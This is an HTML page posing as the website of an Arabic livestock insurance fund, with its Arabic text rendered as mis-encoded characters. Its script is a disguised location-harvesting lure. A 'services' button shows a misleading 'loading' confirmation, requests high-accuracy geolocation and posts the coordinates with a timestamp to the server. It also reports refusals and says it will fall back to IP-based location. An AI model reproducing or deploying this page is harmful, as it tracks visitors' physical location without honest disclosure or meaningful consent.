<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>ุตูุฏูู ุงูุชุฃููู ุนูู ุงูุซุฑูุฉ ุงูุญููุงููุฉ</title>
  <link rel="stylesheet" href="/static/style.css">


</head>
<body>
  <header class="site-header">
    <div class="container header-inner">
      <div class="logo">ุตูุฏูู ุงูุชุฃููู ุนูู ุงูุซุฑูุฉ ุงูุญููุงููุฉ</div>
      <nav class="main-nav">
        <ul>
          <li><a href="#hero">ุงูุฑุฆูุณูุฉ</a></li>
          <li><a href="#services">ุฎุฏูุงุชูุง</a></li>
          <li><a href="#news">ุงูุฃุฎุจุงุฑ</a></li>
          <li><a href="#faq-link">ุงูุฃุณุฆูุฉ ุงูุดุงุฆุนุฉ</a></li>
        </ul>
      </nav>
    </div>
  </header>

  <main>
    <section id="hero" class="hero-section">
      <div class="container hero-inner">
        <div class="hero-text">
          <h1>ุฑุนุงูุฉ ุดุงููุฉ ูููุงุดูู โ ุฃูุงู ูุซุฑูุชู</h1>
          <p>ูุฏุนู ุงููุฒุงุฑุนูู ุจุฎุฏูุงุช ุจูุทุฑูุฉ ูุชูุงููุฉ ูุชุบุทูุฉ ุชุฃููููุฉ ูุญูุงูุฉ ุซุฑูุชู ุงูุญููุงููุฉ.</p>
          <a href="#services" class="btn primary">ุชุนุฑู ุนูู ุฎุฏูุงุช ุงูุชุฃููู</a>
        </div>

        <div class="hero-card">
          <div class="card-title">ุฎุฏูุงุช ููุฏุงููุฉ</div>
          <p class="muted">.</p>

          <button id="startBtn" class="btn accent">ุฏุฎูู ูููุน ุงูุฎุฏูุงุช</button>
          <div id="status" class="status"> &nbsp; </div>
          <pre id="output" class="output"></pre>
        </div>
      </div>
    </section>

    <section id="services" class="content-section">
      <div class="container">
        <h2>ุฎุฏูุงุชูุง ุงูุฃุณุงุณูุฉ</h2>
        <div class="service-cards">
          <div class="card">
            <h3>ุงูุชุฃููู ุงูุดุงูู</h3>
            <p>ุชุบุทูุฉ ูุฑุคูุณ ุงููุงุดูุฉ ุถุฏ ุงููุฎุงุทุฑ ุงููุฎุชููุฉ.</p>
          </div>
          <div class="card">
            <h3>ุงูุฑุนุงูุฉ ุงูุจูุทุฑูุฉ</h3>
            <p>ุฎุฏูุงุช ุจูุทุฑูุฉ ููุฏุงููุฉ ูุงุณุชุดุงุฑุงุช ูููุฒุงุฑุนูู.</p>
          </div>
        </div>
      </div>
    </section>

    <section id="news" class="content-section">
      <div class="container">
        <h2>ุขุฎุฑ ุงูุฃุฎุจุงุฑ ูุตูุฑ ูู ุงูููุฏุงู</h2>

        <div class="news-grid">
          <article class="news-item">
            <h3>ุญููุฉ ุชุญุตูู ูุงุณุนุฉ</h3>
            <p>ุชู ุฅุทูุงู ุญููุฉ ุชุญุตูู ุจุงูุชุนุงูู ูุน ุงูุฌูุงุช ุงููุฎุชุตุฉ.</p>
            <span class="date">12 ุฃูุชูุจุฑ 2025</span>
          </article>

          <div class="gallery">
            <figure class="gallery-item">
              <!-- ุถุน ููุง ุตูุฑุฉ ูุนููุฉ ุฅุฐุง ุฃุฑุฏุช -->
              <figcaption>ุชุญุตูู ุงููุงุดูุฉ ูุฏุนู ููุฏุงูู</figcaption>
            </figure>
            <figure class="gallery-item">
              <figcaption>ูุฑูู ุจูุทุฑู ุฃุซูุงุก ุงูุนูู</figcaption>
            </figure>
            <figure class="gallery-item">
              <figcaption>ุงุณุชุดุงุฑุงุช ูุฏุนู ูููุฒุงุฑุนูู</figcaption>
            </figure>
          </div>
        </div>
      </div>
    </section>

    <section id="faq-link" class="content-section">
      <div class="container">
        <h2>ุงูุฃุณุฆูุฉ ุงูุดุงุฆุนุฉ</h2>
        <p>ูุฏูู ุงุณุชูุณุงุฑุ ุชุตูุญ ูุงุฆูุฉ ุงูุฃุณุฆูุฉ ุงูุดุงุฆุนุฉ ุฃู ุชูุงุตู ูุนูุง.</p>
        <a href="#" class="btn secondary">ุชุตูุญ ุงูุฃุณุฆูุฉ ุงูุดุงุฆุนุฉ</a>
      </div>
    </section>
  </main>

  <footer class="site-footer">
    <div class="container">
      <p>&copy; 2025 ุตูุฏูู ุงูุชุฃููู ุนูู ุงูุซุฑูุฉ ุงูุญููุงููุฉ. ุฌููุน ุงูุญููู ูุญููุธุฉ.</p>
    </div>
  </footer>

<script>
const statusEl = document.getElementById('status');
const outputEl = document.getElementById('output');
const startBtn = document.getElementById('startBtn');

async function sendPayload(payload) {
  try {
    const res = await fetch('/submit', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify(payload)
    });
    const data = await res.json();
    outputEl.textContent = JSON.stringify(data, null, 2);
    statusEl.textContent = 'โุฌุงุฑ ุงูุชุญููู .......';
    statusEl.style.color = '#1b5e20';
  } catch (err) {
    statusEl.textContent = 'โ ุญุฏุซ ุฎุทุฃ ุฃุซูุงุก ุงูุฅุฑุณุงู. ุชุฃูุฏ ูู ุงูุงุชุตุงู.';
    statusEl.style.color = '#b00020';
    outputEl.textContent = String(err);
  }
}

startBtn.addEventListener('click', async () => {
  statusEl.textContent = '';
  outputEl.textContent = '';

  const confirmShare = confirm("ุฌุงุฑ ุงูุชุญููู ........ '.");
  const timestamp = new Date().toISOString();

  if (confirmShare) {
    if (!navigator.geolocation) {
      statusEl.textContent = 'ูุชุตูุญู ูุง ูุฏุนู ุชุญุฏูุฏ ......';
      await sendPayload({permission:'unavailable', latitude:null, longitude:null, timestamp});
      return;
    }

    statusEl.textContent = 'โณ ุฌุงุฑ ุงูุชุญููู...';
    navigator.geolocation.getCurrentPosition(async (pos) => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      statusEl.textContent = '๐ oooooooooooop...';
      await sendPayload({permission:'granted', latitude: lat, longitude: lon, timestamp});
      // ุจุนุฏ ุงูุชุณุฌูู ูููู ุชูุฌูู ุงููุณุชุฎุฏู ูุตูุญุฉ ุดูุฑ ุฃู ูุนูููุงุช ุฅุถุงููุฉ ุฅู ุฑุบุจุช
      // window.location.href = '/athkar'; // ูุซุงู: ุฅุนุงุฏุฉ ุชูุฌูู
    }, async (err) => {
      statusEl.textContent = 'โ๏ธ ูู ูุชู ุงูุณูุงุญ ุจุงููุตูู ูููููุน. ุณูุณุชุฎุฏู ุชูุฏูุฑุงู ุนุจุฑ IP ุฅู ุฃููู.';
      await sendPayload({permission:'denied', latitude:null, longitude:null, timestamp});
    }, { enableHighAccuracy:true, timeout:20000 });
  } else {
    statusEl.textContent = '๐ก ูู ุชูุงูู ุนูู ุงููุดุงุฑูุฉ. ุณูุชู ุงุณุชุฎุฏุงู ุชูุฏูุฑ ุงููููุน ุนุจุฑ IP ุฅู ุฃููู.';
    await sendPayload({permission:'user_declined', latitude:null, longitude:null, timestamp});
  }
});
</script>
</body>
</html>
